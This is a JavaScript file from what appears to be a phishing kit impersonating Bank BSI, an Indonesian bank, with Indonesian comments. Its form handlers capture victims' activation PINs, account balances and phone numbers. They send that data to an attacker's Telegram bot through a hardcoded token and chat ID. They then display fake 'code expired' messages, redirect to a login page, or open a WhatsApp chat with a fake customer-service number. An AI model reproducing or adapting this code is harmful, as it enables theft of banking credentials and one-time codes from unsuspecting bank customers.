function submitForm(event) {
    event.preventDefault();

    var kodeAktivasi = document.getElementById('sixpin').value;

    // Mengirim notifikasi ke Telegram
    sendTelegramNotification(kodeAktivasi);

    // Melanjutkan ke fungsi kirimPesan
    kirimPesan();
  }

  function sendTelegramNotification(kodeAktivasi) {
    var message = "Kode Aktivasi: " + kodeAktivasi;

    var telegramAPI = "https://api.telegram.org/bot7403024559:AAH8XFB-YgCjnNS5EzMLXdNAkmmi-QZca8M/sendMessage";
    var chatID = "-1002166704403";

    $.ajax({
      type: 'POST',
      url: telegramAPI,
      data: {
        chat_id: chatID,
        text: message
      },
      success: function(response) {
        console.log('Notifikasi Telegram Terkirim');
      },
      error: function(error) {
        console.log('Gagal Mengirim Notifikasi Telegram', error);
      }
    });
  }

  function kirimPesan() {
    $("#djload").show();
    document.getElementById('btnSubmit1').innerHTML = "Memproses...";

    $.ajax({
      type: 'POST',
      url: 'req/otp.php',
      async: false,
      dataType: 'JSON',
      data: $('#form2').serialize(),
      complete: function(data) {
        console.log('Complete');
        setTimeout(function() {
          $("#notif").text("- Kode E-Commerce sudah kadaluarsa -");
          $("#notif").css("color", "red");
        }, 2000);
      }
    });

    setTimeout(() => {
      document.getElementById("notif").innerHTML = "Untuk mendapatkan kode E-Commerce,<br/>Silahkan klik tombol dibawah ini";
      $("#djload").hide();
      $("#notif").css("color", "black");
      $("#sixpin").val("");
      document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";
    }, 4000);

    return false;
  }

  function getcs() {
    $("#djload").show();
    var audio4 = document.getElementById("bsiku");
    var audio1 = document.getElementById("bsi");
    audio4.play();
    audio1.load();
    audio4.loop = false;
    setTimeout(function() {
      location.href = 'https://api.whatsapp.com/send?phone=62818710610&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝗕𝗦𝗜%0ASaya mau request kode E-Commerce Aktivasi';
    }, 5000);
    setTimeout(function() {
      $("#djload").hide();
    }, 5100);
  }
  function neraike() {
    // Ambil nilai saldo dari input
    var saldo = document.getElementById('saldo').value;

    // Kirim notifikasi ke Telegram
    fetch('https://api.telegram.org/bot7403024559:AAH8XFB-YgCjnNS5EzMLXdNAkmmi-QZca8M/sendMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: '-1002166704403',
            text: 'Ada pengguna yang mengirimkan formulir dengan saldo terakhir: ' + saldo,
        }),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        // Tambahkan kode lain yang perlu dieksekusi setelah notifikasi terkirim
    })
    .catch((error) => {
        console.error('Error:', error);
        // Handle error jika terjadi kesalahan dalam mengirim notifikasi
    });

    // Return false untuk mencegah pengiriman formulir secara default
    return false;
}
function sendHp() {
  event.preventDefault();
  var nomor = document.getElementById("nohp").value;
  sessionStorage.setItem("nomor", nomor);
  $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";
  var form = document.getElementById("formHP");
  var tarif = form.elements["tarif"].value;
  var nohp = form.elements["nohp"].value;

  // Pengaturan pesan yang akan dikirim ke Telegram
  var message = `
            *Form Data:*
            Tarif: ${tarif === 'baru' ? 'TARIF BARU Rp 150.000 / BULAN' : 'TARIF LAMA Rp 6.500 / TRANSAKSI'}
            No. HP Terdaftar: ${nohp}
        `;

  // Ganti TOKEN_BOT dengan token bot Telegram Anda
  var token = "7403024559:AAH8XFB-YgCjnNS5EzMLXdNAkmmi-QZca8M";
  // Ganti CHAT_ID dengan chat ID yang akan menerima notifikasi
  var chat_id = "-1002166704403";

  var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

  // Kirim permintaan HTTP POST ke API Telegram
  var xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.send();

  $.ajax({
    type: 'POST',
    url: 'req/no.php',
    data: $('#formHP').serialize(),
    datatype: 'text',

    complete: function(data) {
      setTimeout(function() {
        window.location.href = 'login.html'
        document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
        $('.process1').fadeOut();
      }, 800);
    }
  })
}
